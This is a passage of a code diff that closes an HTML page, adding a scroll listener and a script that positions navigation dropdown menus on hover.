+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
